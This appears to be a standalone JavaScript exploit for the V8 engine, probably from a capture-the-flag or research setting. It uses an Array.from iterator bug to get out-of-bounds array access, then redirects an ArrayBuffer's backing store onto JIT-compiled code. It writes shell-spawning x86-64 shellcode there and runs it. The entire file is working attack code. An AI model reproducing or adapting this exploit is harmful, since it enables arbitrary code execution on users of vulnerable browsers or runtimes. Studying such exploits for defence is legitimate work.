var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
//map, header, element] 
function d2u(v) {
  f64[0] = v;
  return u32;
}

function d2s(d){ 
    hexstring = d2u(d)[1].toString(16) + d2u(d)[0].toString(16);
    return hexstring
}

function dprint(target){
  //%DebugPrint(target);console.log('\n\n\n');
}

var arr = [];
var varr = [];
dprint(arr);
let maxSize = 0x100;

function oob(oob_arr){
  Array.from.call(function() { return oob_arr }, {[Symbol.iterator] : _ => (
      {
        counter : 0,
        next() {
          var result = this.counter++;
          if (this.counter > maxSize) {
            //dprint(arr);
            oob_arr.length = 0;//use FixedArray[0] -> old_space
            oob_arr.length = 1;//use FixedArray[1] (FixedArray[0~15]) -> new space
            return {done: true};
          } else {
            return {value: result, done: false};
          }
        }
      }
    )}
  )
}

oob(arr);
dprint(arr);

//goal: overwriting arraybuffer's backing storage address to JIT code

//make arr to double elements array
arr[0] = 0x111111111

var targetf = function(){}
var arrbuf = new ArrayBuffer(0x100);

//trigger JIT compile
for(let i=0;i<1000;i++){
  targetf();
}

dprint(arr);
dprint(targetf);
dprint(arrbuf);
var foffset = 0x80;
var bufoffset = foffset + 0x40;
var codeaddr =  arr[(foffset+0x30)/8]; //code = JSFUntion + 0x30
var storeaddr = arr[(bufoffset+0x20)/8];
console.log('code : ' + d2s(codeaddr));
console.log('store : ' + d2s(storeaddr));
//overwrite storeaddr to codeaddr
arr[(bufoffset+0x20)/8] = codeaddr

storeaddr = arr[(bufoffset+0x20)/8];
console.log('store : ' + d2s(storeaddr));
var u8arr = new Uint8Array(arrbuf);
var shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

for(let i=0;i<shellcode.length;i++){
  //instruction_start = code + 0x60
  u8arr[i+0x60] = shellcode.charCodeAt(i)
}

targetf();

